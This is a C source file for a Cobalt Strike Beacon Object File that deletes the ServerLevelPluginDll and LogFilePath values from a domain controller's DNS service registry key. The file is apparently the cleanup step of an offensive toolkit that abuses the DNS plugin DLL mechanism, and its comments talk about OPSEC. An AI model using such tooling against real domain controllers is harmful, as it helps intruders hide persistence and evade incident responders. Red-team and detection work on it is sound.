//
// dnsrpc_cleanup
//
// Removes `ServerLevelPluginDll` and `LogFilePath` from `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` 
// Requires elevated privileges an must be run on the domain controller itself. Alternatively, you can just use 
// RemoteRegistry to clean this up remotely but if you do so I will judge your poor OPSEC choices.
//

#include "beacon.h"
#include "beacon_dev.h"

#include <windows.h>

#ifndef _DEBUG
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegDeleteValueW(HKEY, LPCWSTR);
DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCloseKey(HKEY);
#else
#pragma comment(lib, "advapi32.lib")
#endif

#define DNS_PARAMS_KEY L"SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters"


VOID delete_value(HKEY handle, LPCWSTR name)
{
    LONG status = API(ADVAPI32, RegDeleteValueW)(handle, name);
    switch (status) {
        case ERROR_SUCCESS:
        case ERROR_FILE_NOT_FOUND:
            BeaconPrintf(CALLBACK_OUTPUT, "Deleted: %ls\\%ls\n", DNS_PARAMS_KEY, name);
            return;
        default:
            BeaconPrintf(CALLBACK_ERROR, "Failed to delete: %ls\\%ls (error %ld)\n", DNS_PARAMS_KEY, name, status);
            return;
    }
}

#ifdef _DEBUG
void wmain(int argc, wchar_t *argv[])
{
#else
void go(PCHAR args, int alen)
{
#endif
    HKEY handle = NULL;

    LONG status = API(ADVAPI32, RegOpenKeyExW)(
        HKEY_LOCAL_MACHINE,
        DNS_PARAMS_KEY,
        0,
        KEY_SET_VALUE,
        &handle
    );

    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, 
            "Failed to open registry key (error %ld). Either the ADIDNS service is not installed on this host, "
            "or you ran it on the wrong machine (this module must be executed on a domain controller). If you don't "
            "care about leaving registry keys behind you can just use `dnsrpc_set_plugin_dll` with an empty string "
            "as the plugin path to prevent the DNS service from crashing on next restart.\n", status
        );
        return;
    }

    delete_value(handle, L"ServerLevelPluginDll");
    delete_value(handle, L"LogFilePath");

    API(ADVAPI32, RegCloseKey)(handle);
}